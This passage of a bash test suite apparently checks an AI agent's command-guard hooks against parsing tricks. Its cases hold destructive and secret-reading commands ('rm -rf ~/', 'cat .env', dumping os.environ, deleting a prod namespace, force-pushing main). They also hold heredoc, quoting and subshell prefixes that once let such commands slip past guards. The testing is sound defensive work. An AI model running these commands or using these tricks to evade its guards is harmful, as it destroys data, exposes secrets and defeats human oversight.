  for fn in strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash runs" "[$out]"
  done
  out=$(separate_groups "${cmd//"$M"/$GM}")
  [[ "$out" == *";echo HDMARK;"* ]] && pass "$label: separate_groups opens the group" || fail "$label: separate_groups left a group bash runs" "[$out]"
done
# The string after the # is quoted, so neutralize hides its separators.
for ((i = 1; i < ${#WORD[@]}; i += 2)); do
  cmd="${WORD[$i]} ; $M ; echo \""
  runs_in_bash "$cmd" && { fail "${WORD[$((i - 1))]} ; $M" "(bash ran the marker: the case is wrong)"; continue; }
  out=$(neutralize_quoted_separators "$cmd")
  [[ "$out" == *"%3B $M %3B"* ]] && pass "${WORD[$((i - 1))]}: neutralize hides the ; in the string" || fail "${WORD[$((i - 1))]}: neutralize kept a quoted ;" "[$out]"
done
for p in "${WORD_CONTROL[@]}"; do
  cmd=$(word_row "$p")
  runs_in_bash "$cmd" && { fail "$p" "(bash ran the marker: the control is wrong)"; continue; }
  keeps "$(drop_data_heredocs "$cmd")" && fail "$p: drop_data_heredocs keeps the body" "" || pass "$p: a comment, and the body is still data"
done
for ((i = 0; i < ${#DOLLAR[@]}; i += 2)); do
  label=${DOLLAR[$i]}; cmd=${DOLLAR[$((i + 1))]}
  if ! runs_in_bash "$cmd"; then [ -n "$B32" ] && fail "$label" "(bash 3.2 did not run the marker: the case is wrong)"; continue; fi
  nd2=$((nd2 + 1))
  out=$(strip_message_heredocs "$(as_message "$cmd")")
  keeps "$out" && pass "$label: strip_message_heredocs keeps it" || fail "$label: strip_message_heredocs dropped a line bash runs" "[$out]"
  for fn in strip_inert_heredocs drop_data_heredocs; do
    out=$("$fn" "$cmd")
    keeps "$out" && pass "$label: $fn keeps it" || fail "$label: $fn dropped a line bash runs" "[$out]"
  done
done
for cmd in "${DOLLAR_CONTROL[@]}"; do
  runs_in_bash "$cmd" && { fail "\$\$' outside a substitution" "(bash ran the marker: the control is wrong)"; continue; }
  keeps "$(drop_data_heredocs "$cmd")" && fail "\$\$' outside a substitution: drop_data_heredocs keeps the body" "" \
    || pass "\$\$' outside a substitution: the pid, and the body is still data"
done
[ "$nw" = $((${#WORD[@]} / 2)) ] && pass "bash ran the marker in all $nw word rows" || fail "bash ran the marker in $nw word rows" "of $((${#WORD[@]} / 2))"
if [ -n "$B32" ]; then
  [ "$nd2" = $((${#DOLLAR[@]} / 2)) ] && pass "bash 3.2 ran the marker in all $nd2 \$\$' rows" || fail "bash 3.2 ran the marker in $nd2 \$\$' rows" "of $((${#DOLLAR[@]} / 2))"
else echo "  ($nd2 of $((${#DOLLAR[@]} / 2)) \$\$' rows run the marker in this /bin/bash, which is not 3.2)"; fi

echo ""
echo "=== bash runs a grouped marker: separate_groups opens the group ==="
# separate_groups turns an unquoted ( or ) into ; so a guard sees the command
# inside. Left as heredoc data, `(kubectl delete ...)` reached no guard.
G='(echo HDMARK)'
for ((i = 0; i < ${#CASES[@]}; i += 2)); do
  label=${CASES[$i]}; cmd=${CASES[$((i + 1))]//"$M"/$G}
  runs_in_bash "$cmd" || continue
  out=$(separate_groups "$cmd")
  printf '%s\n' "$out" | grep -qF ';echo HDMARK;' && pass "$label: separate_groups opens it" \
    || fail "$label: separate_groups left a group bash runs" "[$out]"
done

# On one line: an escaped $ before ' starts no $'...', so the group after it is unquoted.
cmd="echo \\\$'a\\' ; $G ; echo 'x'"
if runs_in_bash "$cmd"; then
  printf '%s\n' "$(separate_groups "$cmd")" | grep -qF ';echo HDMARK;' && pass "an escaped \$': separate_groups opens the group" \
    || fail "an escaped \$': separate_groups left a group bash runs" "[$(separate_groups "$cmd")]"
else fail "an escaped \$', then a group" "(bash did not run the marker: the case is wrong)"; fi

# The commit shape: the message sits inside "$( )", and a command follows the
# closing `)"` on its line.
COMMIT=$'git commit -m "$(cat <<\'EOF\'\na note\nEOF\n)"'
cmd="$COMMIT && $G"
if runs_in_bash "$cmd"; then
  printf '%s\n' "$(separate_groups "$cmd")" | grep -qF ';echo HDMARK;' && pass "after a commit message: separate_groups opens the group" \
    || fail "after a commit message: separate_groups left a group bash runs" "[$(separate_groups "$cmd")]"
else fail "a commit message, then a group" "(bash did not run the marker: the case is wrong)"; fi

echo ""
echo "=== bash reads the marker as data: the stripper meant for it still drops it ==="
# fn|label|command. These are why the strippers exist; keeping everything would
# pass the table above and break every commit message that mentions a guarded verb.
DROPS=(
  "strip_message_heredocs|git commit -F - <<'EOF'"   $'git commit -F - <<\'EOF\'\n'"$M"$'\nEOF'
  "strip_message_heredocs|git commit -m \"\$(cat <<'EOF'" $'git commit -m "$(cat <<\'EOF\'\n'"$M"$'\nEOF\n)"'
  "strip_message_heredocs|gh pr create --body-file -" $'gh pr create --title t --body-file - <<\'EOF\'\n'"$M"$'\nEOF'
  "strip_message_heredocs|a quoted --author before the opener" $'git commit --author=\'A B <a@b>\' -F - <<\'EOF\'\n'"$M"$'\nEOF'
  "strip_inert_heredocs|a quoted word before the opener" $'echo \'a b\' > notes.md; cat <<\'EOF\' >> notes.md\n'"$M"$'\nEOF'
  "strip_inert_heredocs|cat <<'EOF' > notes.md"      $'cat <<\'EOF\' > notes.md\n'"$M"$'\nEOF'
  "strip_inert_heredocs|cat <<EOF > notes.md"        $'cat <<EOF > notes.md\n'"$M"$'\nEOF'
  "strip_inert_heredocs|cat <<\"EOF\" > notes.md"    $'cat <<"EOF" > notes.md\n'"$M"$'\nEOF'
  "strip_inert_heredocs|cat <<\\EOF > notes.md"      $'cat <<\\EOF > notes.md\n'"$M"$'\nEOF'
  "strip_inert_heredocs|cat <<-EOF, tab-indented"    $'cat <<-EOF > notes.md\n\t'"$M"$'\n\tEOF'
  "strip_inert_heredocs|cat > notes.md <<'EOF'"      $'cat > notes.md <<\'EOF\'\n'"$M"$'\nEOF'
  "strip_inert_heredocs|after a here-string"         $'cat <<<x > a.md; cat <<\'EOF\' > notes.md\n'"$M"$'\nEOF'
  "drop_data_heredocs|cat <<EOF"                     $'cat <<EOF\n'"$M"$'\nEOF'
  "drop_data_heredocs|python3 - <<'EOF'"             $'python3 - <<\'EOF\'\n'"$M"$'\nEOF'
  "drop_data_heredocs|cat <<EOF > a.md, no shell on the line" $'cat <<EOF > a.md\n'"$M"$'\nEOF'
  "drop_data_heredocs|a # inside backticks ends there, then an opener" $'x="`true #`" ; cat <<EOF > a.md\n'"$M"$'\nEOF'
)
for ((i = 0; i < ${#DROPS[@]}; i += 2)); do
  fn=${DROPS[$i]%%|*}; label=${DROPS[$i]#*|}; cmd=${DROPS[$((i + 1))]}
  runs_in_bash "$cmd" && { fail "$label" "(bash ran the marker: the case is wrong)"; continue; }
  out=$("$fn" "$cmd")
  keeps "$out" && fail "$fn still drops: $label" "[$out]" || pass "$fn still drops: $label"
done

echo ""
echo "=== the six heredoc-aware guards: a line after a false opener is judged as typed ==="
verdict() {  # hook command: deny, ask or allow
  local out rc d
  out=$(jq -nc --arg c "$2" --arg d "$TMP/run" '{tool_name:"Bash", hook_event_name:"PreToolUse", tool_input:{command:$c}, cwd:$d, session_id:"hd"}' \
        | HOME="$TMP/home" bash "hooks/$1.sh" 2>/dev/null); rc=$?
  d=$(printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null)
  [ -n "$d" ] || { [ "$rc" = 2 ] && d=deny || d=allow; }
  printf '%s' "$d"
}
GUARDS=(git-guard config-guard kubectl-guard env-guard interpreter-guard network-guard rm-guard)
RISK=("git push --force origin main" "cp /dev/null ~/.claude/settings.json" "kubectl delete ns prod"
      "cat .env" "python3 -c 'import os; print(os.environ)'" "curl -X DELETE https://example.com/x" "rm -rf ~/")
PREFIXES=('cat <<<x' 'echo "<<x"' 'true # <<x' 'echo $((1<<x))'
          "true # it's" 'true # a "b' "echo \"\$(echo \"it's\")\"" $'cat <<EOF > notes.md\nit\'s\nEOF')
for g in "${!GUARDS[@]}"; do
  ctl=$(verdict "${GUARDS[$g]}" "${RISK[$g]}")
  [ "$ctl" != allow ] || { fail "${GUARDS[$g]} control" "allows '${RISK[$g]}' alone: pick another line"; continue; }
  for p in "${PREFIXES[@]}"; do
    v=$(verdict "${GUARDS[$g]}" "$(printf '%s\n%s\nx' "$p" "${RISK[$g]}")")
    [ "$v" = "$ctl" ] && pass "${GUARDS[$g]} after '$p': $v" || fail "${GUARDS[$g]} after '$p'" "$v, alone: $ctl"
  done
  # An escaped $ before ' starts no $'...: the ; after it separates. Read as
  # $'...', the rest of the line was quoted text, and four guards allowed it.
  v=$(verdict "${GUARDS[$g]}" "echo \\\$'a\\' ; ${RISK[$g]} ; echo 'x'")
  [ "$v" = "$ctl" ] && pass "${GUARDS[$g]} after an escaped \$': $v" || fail "${GUARDS[$g]} after an escaped \$'" "$v, alone: $ctl"
  # After a command hd_scan cannot read, the line is read as before hd_scan.
  v=$(verdict "${GUARDS[$g]}" "echo \"a(b)\" \"\${x:-\"y\"}\" ; ${RISK[$g]}")
  [ "$v" = "$ctl" ] && pass "${GUARDS[$g]} after an unreadable command: $v" || fail "${GUARDS[$g]} after an unreadable command" "$v, alone: $ctl"
  for tail in "&& ${RISK[$g]}" "; ${RISK[$g]}" "&& (${RISK[$g]})"; do
    v=$(verdict "${GUARDS[$g]}" "$COMMIT $tail")
    [ "$v" = "$ctl" ] && pass "${GUARDS[$g]}, a commit message then '$tail': $v" || fail "${GUARDS[$g]}, a commit message then '$tail'" "$v, alone: $ctl"
  done
done

# bash 3.2 ends a "$( )" at a ) in its heredoc body and runs what follows: such
# a body is read as before hd_scan, plain or grouped.
for r in 'rm -rf ~/' '(rm -rf ~/)'; do
  v=$(verdict rm-guard "git commit -m \"\$(cat <<'EOF'"$'\n'"a )\" ; $r ; echo \""$'\n'"EOF"$'\n'")\"")
  [ "$v" = deny ] && pass "rm-guard, '$r' after a ) in a \"\$( )\" message: deny" || fail "rm-guard, '$r' after a ) in a \"\$( )\" message" "$v"
done

GROUPED="(kubectl delete ns prod)"
GCTL=$(verdict kubectl-guard "$GROUPED")
for p in "${PREFIXES[@]}"; do
  v=$(verdict kubectl-guard "$(printf '%s\n%s\nx' "$p" "$GROUPED")")
  [ "$v" = "$GCTL" ] && pass "kubectl-guard, a group after '$p': $v" || fail "kubectl-guard, a group after '$p'" "$v, alone: $GCTL"
done


echo ""
echo "=== skill-forge's demand.py reads heredocs as bash does ==="
# demand.py counts the commands a session runs; a body read as commands, or a
# command read as a body, miscounts them. Same cases, same oracle.
DPY=$(bash skills/skill-forge/bin/python.sh 2>/dev/null)
if [ -z "$DPY" ]; then
  # CI sets up Python 3.12: a skip there would leave the parity check unable to fail.
  if [ -n "${CI:-}" ]; then fail "demand.py parity" "no Python 3.10+ in CI"; else echo "  SKIP: no Python 3.10+ with a TOML reader"; fi
else
  demand_keeps() {   # each command, NUL-ended, on stdin: 1 if drop_heredocs keeps the marker line
    "$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import demand
for c in sys.stdin.read().split("\0")[:-1]:
    print(int("echo HDMARK" in demand.drop_heredocs(c).split("\n")))'
  }
  KEEP=()
  while IFS= read -r k; do KEEP+=("$k"); done < <(for i in "${RUNS[@]}"; do printf '%s\0' "${CASES[$((i + 1))]}"; done | demand_keeps)
  for j in "${!RUNS[@]}"; do
    label=${CASES[${RUNS[$j]}]}
    [ "${KEEP[$j]}" = 1 ] && pass "$label: demand.py keeps it" || fail "$label: demand.py dropped a line bash runs" ""
  done
  [ "${#KEEP[@]}" -ge 25 ] && pass "demand.py read ${#KEEP[@]} cases bash runs" || fail "demand.py's cases" "only ${#KEEP[@]}"
  # A counter keeps a body only when a shell runs it; lib.sh keeps one whenever
  # its line names a shell, so these are demand.py's alone.
  DEMAND_DROPS=(
    "a PR title naming bash"   $'gh pr create --title "hooks: bash 3.2 fix" --body-file - <<\'EOF\'\n'"$M"$'\nEOF'
    "a path naming sh"         $'cat > /etc/profile.d/x.sh <<\'EOF\'\n'"$M"$'\nEOF'
    "an unreadable line after a body" $'cat > notes.md <<\'EOF\'\n'"$M"$'\nEOF\necho "${OUT:-\'none\'}"'
  )
  DD=()
  while IFS= read -r k; do DD+=("$k"); done < <(for ((i = 1; i < ${#DEMAND_DROPS[@]}; i += 2)); do printf '%s\0' "${DEMAND_DROPS[$i]}"; done | demand_keeps)
  for ((i = 0; i < ${#DEMAND_DROPS[@]}; i += 2)); do
    [ "${DD[$((i / 2))]}" = 0 ] && pass "${DEMAND_DROPS[$i]}: demand.py drops the body" || fail "${DEMAND_DROPS[$i]}: demand.py counts a body no shell runs" ""
  done
  # Every bash-3.2-only row above, on any bash: demand.py keeps each as typed.
  for ((i = 0; i < ${#INSUB[@]}; i += 2)); do
    [ "$(printf '%s\0' "${INSUB[$((i + 1))]}" | demand_keeps)" = 1 ] \
      && pass "${INSUB[$i]}: demand.py keeps it" || fail "${INSUB[$i]}: demand.py dropped a line bash 3.2 runs" ""
  done
  for ((i = 0; i < ${#ASIS[@]}; i += 2)); do
    [ "$(printf '%s\0' "${ASIS[$((i + 1))]}" | demand_keeps)" = 1 ] \
      && pass "${ASIS[$i]}: demand.py keeps the body" || fail "${ASIS[$i]}: demand.py dropped the body" ""
  done
  # The opener-line rows, on any bash: demand.py keeps each body as typed.
  OA=("${OPENAT[@]}" "${FRAME_OPEN[@]}" "${ZSH_OPENAT[@]}" "${AFTER[@]}" "${WORDR[@]}" "${DOLLAR[@]}")
  OK=()
  while IFS= read -r k; do OK+=("$k"); done < <(for ((i = 1; i < ${#OA[@]}; i += 2)); do printf '%s\0' "${OA[$i]}"; done | demand_keeps)
  for ((i = 0; i < ${#OA[@]}; i += 2)); do
    [ "${OK[$((i / 2))]}" = 1 ] && pass "${OA[$i]}: demand.py keeps it" || fail "${OA[$i]}: demand.py dropped it" ""
  done
  WC=()
  while IFS= read -r k; do WC+=("$k"); done < <({ for p in "${WORD_CONTROL[@]}"; do printf '%s\0' "$(word_row "$p")"; done; for c in "${DOLLAR_CONTROL[@]}"; do printf '%s\0' "$c"; done; } | demand_keeps)
  [ "${WC[*]}" = "0 0 0 0" ] && pass "a comment after a subshell ), and \$\$' outside a substitution: demand.py drops the body" \
    || fail "the word and \$\$' controls: demand.py" "[${WC[*]}]"
  CA=()
  while IFS= read -r k; do CA+=("$k"); done < <(for c in "${CLOSED_AFTER[@]}"; do printf '%s\0' "$c"; done | demand_keeps)
  [ "${CA[*]}" = "0 0" ] && pass "a \$( ) closed on the opener line: demand.py still drops the body" \
    || fail "a \$( ) closed on the opener line: demand.py" "[${CA[*]}]"
  # The comment and ${ } rules in "$( )": Heredocs.scan raises on one line of each.
  demand_unread() {   # each command, NUL-ended, on stdin: 1 if a line is unreadable
    "$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import demand
for c in sys.stdin.read().split("\0")[:-1]:
    h = demand.Heredocs()
    try:
        for ln in c.split("\n"):
            h.scan(ln)
        print(0)
    except ValueError:
        print(1)'
  }
  DU=()
  IDC=(); for ((i = 1; i < ${#ITEMD[@]}; i += 2)); do IDC+=("${ITEMD[$i]}"); done
  while IFS= read -r k; do DU+=("$k"); done < <(for c in "${IDC[@]}" "${UNREAD_D[@]}" "${READ_D[@]}"; do printf '%s\0' "$c"; done | demand_unread)
  want=$((${#IDC[@]} + ${#UNREAD_D[@]}))
  for j in "${!DU[@]}"; do
    if [ "$j" -lt "$want" ]; then [ "${DU[$j]}" = 1 ] && pass "demand.py: unreadable row $j" || fail "demand.py read item-D row $j" ""
    else [ "${DU[$j]}" = 0 ] && pass "demand.py: readable row $j" || fail "demand.py: readable row $j is unreadable" ""; fi
  done
  [ "${#DU[@]}" = $((want + ${#READ_D[@]})) ] && pass "demand.py read every item-D row" || fail "demand.py's item-D rows" "${#DU[@]}"
  # After a substitution that closed, demand.py reads the body as without it;
  # after each doubt, it keeps the body as typed.
  DC=()
  while IFS= read -r k; do DC+=("$k"); done < <(for ((i = 0; i < ${#CLOSED_ROWS[@]}; i += 3)); do printf '%s\0%s\0' "${CLOSED_ROWS[$((i + 1))]}" "${CLOSED_ROWS[$((i + 2))]}"; done | "$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import demand
f = sys.stdin.read().split("\0")[:-1]
for p, c in zip(f[0::2], f[1::2]):
    b1 = c.split("\n")[1]
    print(int((b1 in demand.drop_heredocs(p + c).split("\n")) == (b1 in demand.drop_heredocs(c).split("\n"))))')
  bad=0
  for k in "${DC[@]}"; do [ "$k" = 1 ] || bad=$((bad + 1)); done
  [ "${#DC[@]}" = $((${#CLOSED_ROWS[@]} / 3)) ] && [ "$bad" = 0 ] && pass "demand.py reads ${#DC[@]} bodies after a closed substitution as without it" \
    || fail "demand.py after a closed substitution" "$bad of ${#DC[@]} read unlike without the prefix"
  DD2=()
  while IFS= read -r k; do DD2+=("$k"); done < <(for ((i = 1; i < ${#DOUBT[@]}; i += 2)); do printf '%s\0' "${DOUBT[$i]}"$'cat > notes.md <<\'EOF\'\n)\n'"$M"$'\nEOF'; done | demand_keeps)
  for ((i = 0; i < ${#DOUBT[@]}; i += 2)); do
    [ "${DD2[$((i / 2))]}" = 1 ] && pass "after ${DOUBT[$i]}: demand.py keeps the body" || fail "after ${DOUBT[$i]}: demand.py dropped the body" ""
  done
  # Not a bash-oracle case: the oracle runs under env -i, where $SHELL is unset.
  [ "$(printf '%s\0' $'cat <<\'EOF\' | $SHELL\n'"$M"$'\nEOF' | demand_keeps)" = 1 ] \
    && pass "a body piped to \$SHELL: demand.py keeps it" || fail "a body piped to \$SHELL: demand.py dropped it" ""
  # A quote inside backticks that holds a backtick: hd_scan's HD_BAD, demand.py's ValueError.
  r=$("$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import demand
try:
    demand.Heredocs().scan(sys.argv[1]); print("read")
except ValueError:
    print("unreadable")' 'echo "`echo "x`"; true')
  [ "$r" = unreadable ] && pass "demand.py: a backtick-holding quote inside backticks is unreadable" || fail "demand.py read a backtick-holding quote inside backticks" "$r"
  # After a # right after a substitution's ), a quote opens: the << on the next line is in the string.
  r=$("$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import demand
for p in sys.argv[1:]:
    h = demand.Heredocs(); h.scan(p); print(int(h.scan("cat <<EOF") is None))' 'echo $(pwd)#"' 'echo $((1))#"' 'cat <(echo a)#"' | tr '\n' ' ')
  [ "$r" = "1 1 1 " ] && pass "demand.py: after \$(pwd)#\", \$((1))#\" and <(echo a)#\", a << is in the string" || fail "demand.py read # after a substitution's ) as a comment" "[$r]"
  DKEEP=()
  while IFS= read -r k; do DKEEP+=("$k"); done < <(for ((i = 1; i < ${#DROPS[@]}; i += 2)); do printf '%s\0' "${DROPS[$i]}"; done | demand_keeps)
  for ((i = 0; i < ${#DROPS[@]}; i += 2)); do
    label=${DROPS[$i]#*|}
    [ "${DKEEP[$((i / 2))]}" = 0 ] && pass "$label: demand.py drops the body" || fail "$label: demand.py kept a body bash does not run" ""
  done
  # Where hd_scan cannot read a line, lib.sh keeps the command as typed, and so
  # does demand.py: a case pattern ) inside "$( )" would close it early, and the
  # << after it would look real.
  cmd=$'echo "$(case x in x) echo "a";; esac)" <<EOF\n'"$M"$'\nEOF'
  keeps "$(drop_data_heredocs "$cmd")" && [ "$(printf '%s\0' "$cmd" | demand_keeps)" = 1 ] \
    && pass "case inside \"\$( )\": lib.sh and demand.py keep it as typed" \
    || fail "case inside \"\$( )\": a reader dropped it" "[$(drop_data_heredocs "$cmd")]"
  # skill_lint's shell_code finds openers with the same reader (heredocs.py): where
  # bash runs the marker line, a comment there is blanked (or the script is
  # unreadable, a lint finding); where bash reads it as body data, it stays.
  lint_apply() {   # each script, NUL-ended, on stdin: 1 if "--apply" survives shell_code, 2 if unreadable
    "$DPY" -c '
import sys; sys.path.insert(0, "skills/skill-forge/bin"); import skill_lint
for c in sys.stdin.read().split("\0")[:-1]:
    try:
        print(int("--apply" in skill_lint.shell_code(c)))
    except skill_lint.Unreadable:
        print(2)'
  }
  LA=()
  while IFS= read -r k; do LA+=("$k"); done < <(for i in "${RUNS[@]}"; do printf '%s\0' "${CASES[$((i + 1))]//"$M"/# --apply}"; done | lint_apply)
  [ "${#LA[@]}" = "${#RUNS[@]}" ] && pass "skill_lint answered for each of the ${#RUNS[@]} cases bash runs" \
    || fail "skill_lint's answers" "${#LA[@]} of ${#RUNS[@]}: the helper failed"
  for j in "${!RUNS[@]}"; do
    [ "${LA[$j]}" != 1 ] && pass "${CASES[${RUNS[$j]}]}: skill_lint reads the line bash runs as code" \
      || fail "${CASES[${RUNS[$j]}]}: skill_lint read a comment bash skips as heredoc data" ""
  done
  LD=()
  while IFS= read -r k; do LD+=("$k"); done < <(for ((i = 1; i < ${#DROPS[@]}; i += 2)); do printf '%s\0' "${DROPS[$i]//"$M"/# --apply}"; done | lint_apply)
  [ "${#LD[@]}" = "$(( ${#DROPS[@]} / 2 ))" ] && pass "skill_lint answered for each dropped-body case" \
    || fail "skill_lint's answers" "${#LD[@]} of $(( ${#DROPS[@]} / 2 )): the helper failed"
  for ((i = 0; i < ${#DROPS[@]}; i += 2)); do
    [ "${LD[$((i / 2))]}" = 1 ] && pass "${DROPS[$i]#*|}: skill_lint keeps the body line" || fail "${DROPS[$i]#*|}: skill_lint" "${LD[$((i / 2))]}"
  done
  # The case that made a comment pass skill_lint's --apply check.
  [ "$(printf '%s\0' $'echo "a <<EOF"\n# --apply\nkubectl apply -f a.yaml' | lint_apply)" = 0 ] \
    && pass "skill_lint: a comment after a quoted <<EOF is not --apply" || fail "skill_lint: a comment after a quoted <<EOF counted as --apply" ""
fi

echo ""
echo "=== a command after a prefix bash reads whole: neutralize keeps its separator, separate_groups its group ==="
# The marker follows `P ; `. Each prefix ends outside any quote, as bash reads it.
LEX=(
  "double quotes holding '"        $'echo "it\'s"'
  "single quotes holding \""       $'echo \'a"b\''
  "an escaped \" in double quotes"  $'echo "a\\"b"'
  "an escaped '"                   $'echo a\\\'b'
  "\$'...' with an escaped '"      $'echo $\'it\\\'s\''
  "an escaped \$ before '"         $'echo \\$\'a\\\''
  "\"\$( )\" holding \"'\""        $'echo "$(echo "it\'s")"'
  "\"\$( )\" holding ')'"          $'echo "$(echo \')\')"'
  "a backtick in double quotes"    $'echo "`echo it`\'"'
  "\${ } holding \"'\" unquoted"   $'echo ${x:-"it\'s"}'
  "backticks holding \"'\""        $'echo `echo "it\'s"`'
  "a comment holding '"            $'true # it\'s\ntrue'
  "a comment holding one \""       $'true # a "b\ntrue'
  "a heredoc body holding '"       $'cat <<EOF > /dev/null\nit\'s\nEOF\ntrue'
  "a commit message heredoc in \"\$( )\"" $'git commit -m "$(cat <<\'EOF\'\na note (b); c\nEOF\n)"'
)
for ((i = 0; i < ${#LEX[@]}; i += 2)); do
  label=${LEX[$i]}; p=${LEX[$((i + 1))]}
  n="$p ; echo HDMARK"; g="$p ; (echo HDMARK)"
  if ! runs_in_bash "$n" || ! runs_in_bash "$g"; then fail "$label" "(bash did not run the marker: the case is wrong)"; continue; fi
  out=$(neutralize_quoted_separators "$n")
  [[ "$out" == *"; echo HDMARK"* ]] && pass "$label: neutralize keeps the ;" || fail "$label: neutralize hid a ; bash runs" "[$out]"
  out=$(separate_groups "$g")
  [[ "$out" == *";echo HDMARK;"* ]] && pass "$label: separate_groups opens the group" || fail "$label: separate_groups left a group bash runs" "[$out]"
done

echo ""
echo "=== a command inside a substitution or a heredoc body that bash runs ==="
# Inside \$( ) its output is captured, so the marker goes to fd 3, a copy of stdout.
INNER=(
  "neutralize|; echo HDMARK|a ; in \"\$( )\""             $'exec 3>&1; echo "$(true; echo HDMARK >&3)"'
  "neutralize|; echo HDMARK|a ; in a backtick in double quotes" $'exec 3>&1; echo "`true; echo HDMARK >&3`"'
  "neutralize|; echo HDMARK|a ; in \$( ) in \"\$(( ))\"" $'exec 3>&1; echo "$(( $(true; echo HDMARK >&3; echo 1) ))"'
  "groups|;echo HDMARK >&3;|a group in \"\$( )\""          $'exec 3>&1; echo "$( (echo HDMARK >&3) )"'
  "groups|;echo HDMARK;|a group in \$( ) in an unquoted heredoc body" $'cat <<EOF\n$( (echo HDMARK) )\nEOF'
  "neutralize|; echo HDMARK|a ; in \$( ) after a body's apostrophe" $'exec 3>&1; cat <<EOF\nit\'s $(true; echo HDMARK >&3)\nEOF'
  "neutralize|; echo HDMARK|a ; in backticks a body quotes" $'exec 3>&1; cat <<EOF\n"`true; echo HDMARK >&3`"\nEOF'
  "neutralize|; echo HDMARK|a ; after \$\$'...'" $'echo $$\'a\\\' ; echo HDMARK ; echo \'x\''
  "groups|;echo HDMARK >&3;|a <( ) in an unquoted \${ }" $'exec 3>&1; echo ${x:-<(echo HDMARK >&3)}'
  "neutralize|; echo HDMARK|a # inside backticks ends at the backtick" $'x="`true #`"\nexec 3>&1; echo `true ; echo HDMARK >&3 ; true`'
)
for ((i = 0; i < ${#INNER[@]}; i += 2)); do
  IFS='|' read -r fn want label <<<"${INNER[$i]}"; cmd=${INNER[$((i + 1))]}
  runs_in_bash "$cmd" || { fail "$label" "(bash did not run the marker: the case is wrong)"; continue; }
  if [ "$fn" = neutralize ]; then out=$(neutralize_quoted_separators "$cmd"); else out=$(separate_groups "$cmd"); fi
  [[ "$out" == *"$want"* ]] && pass "$label: $fn sees it" || fail "$label: $fn hid what bash runs" "[$out]"
done
# A quoted delimiter: bash prints the body as text, and it stays as typed.
cmd=$'cat <<\'EOF\'\n$( (echo HDMARK) )\nEOF'
if runs_in_bash "$cmd"; then fail "a quoted heredoc body" "(bash ran the marker: the case is wrong)"
else [ "$(separate_groups "$cmd")" = "$cmd" ] && pass "a quoted heredoc body: separate_groups leaves it as typed" \
       || fail "a quoted heredoc body: separate_groups changed data" "[$(separate_groups "$cmd")]"; fi

# A caller may pass a body already dropped (strip_inert_heredocs keeps the opener,
# not the terminator): with no terminator line, the lines after an opener are code.
out=$(separate_groups $'cat <<\'EOF\' > notes.md\n(echo HDMARK)')
[[ "$out" == *";echo HDMARK;"* ]] && pass "an opener with no terminator: the next line's group opens" \
  || fail "an opener with no terminator" "[$out]"
# The ) that closes "$( )" is not a group: it stays, as it did before the classes.
[ "$(separate_groups 'echo "$(date)" ; (x)')" = 'echo "$(date)" ; ;x;' ] && pass "a quoted \$( )'s ) stays" \
  || fail "a quoted \$( )'s )" "[$(separate_groups 'echo "$(date)" ; (x)')]"

# What stays text: an escaped ;, a ; inside "${ }", and "${ }" with quotes in an
# unquoted heredoc body, where quotes are text.
[[ "$(neutralize_quoted_separators 'echo a\;b ; ls')" == 'echo a\%3Bb ; ls' ]] && pass "an escaped ; stays hidden" \
  || fail "an escaped ;" "[$(neutralize_quoted_separators 'echo a\;b ; ls')]"
[[ "$(neutralize_quoted_separators 'echo "${x:-a;b}" ; ls')" == 'echo "${x:-a%3Bb}" ; ls' ]] && pass 'a ; in "${ }" stays hidden' \
  || fail 'a ; in "${ }"' "[$(neutralize_quoted_separators 'echo "${x:-a;b}" ; ls')]"
[[ "$(neutralize_quoted_separators 'echo ${x:-a;b} ; ls')" == 'echo ${x:-a%3Bb} ; ls' ]] && pass 'a ; in an unquoted ${ } stays hidden' \
  || fail 'a ; in an unquoted ${ }' "[$(neutralize_quoted_separators 'echo ${x:-a;b} ; ls')]"
neutralize_quoted_separators $'cat <<EOF > x.sh\n${FOO:-"bar"}\nEOF\nls ; ls' >/dev/null \
  && pass 'a heredoc body holding "${ }" with quotes is readable' || fail 'a heredoc body holding "${ }" with quotes' "rc=$?"
# Heredoc data is read a line at a time: its apostrophe does not reach the next line.
[[ "$(neutralize_quoted_separators $'cat <<EOF > n.md\nit\'s\na; b\nEOF\nls')" == *$'\na; b\n'* ]] \
  && pass "a body line's quote ends with the line" || fail "a body line's quote" "[$(neutralize_quoted_separators $'cat <<EOF > n.md\nit\'s\na; b\nEOF\nls')]"
neutralize_quoted_separators $'echo "`cat <<EOF `" ; ls\nhi\nEOF' >/dev/null; rc=$?
[ "$rc" = 3 ] && pass "a heredoc opened inside backticks in quotes is unreadable" || fail "a heredoc in a quoted backtick" "rc=$rc"

echo ""
echo "=== a command hd_scan cannot read: neutralize says so, and a guard asks rather than allows ==="
UNREAD=$'echo "${x:-"it\'s"}"'
neutralize_quoted_separators "$UNREAD ; ls" >/dev/null; rc=$?
[ "$rc" = 3 ] && pass "neutralize returns 3" || fail "neutralize on an unreadable command" "rc=$rc"
[ "$(verdict rm-guard "$UNREAD ; rm -f notes.txt")" = ask ] && pass "rm-guard asks where it would allow" \
  || fail "rm-guard on an unreadable command" "$(verdict rm-guard "$UNREAD ; rm -f notes.txt")"
for g in "${!GUARDS[@]}"; do
  v=$(verdict "${GUARDS[$g]}" "$UNREAD ; ${RISK[$g]}")
  [ "$v" != allow ] && pass "${GUARDS[$g]} after an unreadable prefix: $v" || fail "${GUARDS[$g]} after an unreadable prefix" "allow"
done
[ "$(verdict network-guard "$UNREAD ; curl -s http://127.0.0.1:8080/x")" = ask ] && pass "network-guard asks where it would allow" \
  || fail "network-guard on an unreadable command" "$(verdict network-guard "$UNREAD ; curl -s http://127.0.0.1:8080/x")"
[ "$(verdict network-guard "curl -s http://127.0.0.1:8080/x")" = allow ] && pass "network-guard's control allows" \
  || fail "network-guard's control" "$(verdict network-guard "curl -s http://127.0.0.1:8080/x")"
# The old reading, too, takes $$ as the pid: the rm after it is read, and denied.
v=$(verdict rm-guard "echo \${x:-\"y\"} ; echo \$\$'a\\' ; rm -rf ~/ ; echo 'x'")
[ "$v" = deny ] && pass "after an unreadable command, \$\$' quotes plainly: deny" || fail "\$\$' in the old reading" "$v"
# Each bash-oracle case hd_scan cannot read: every paren opens there, so the
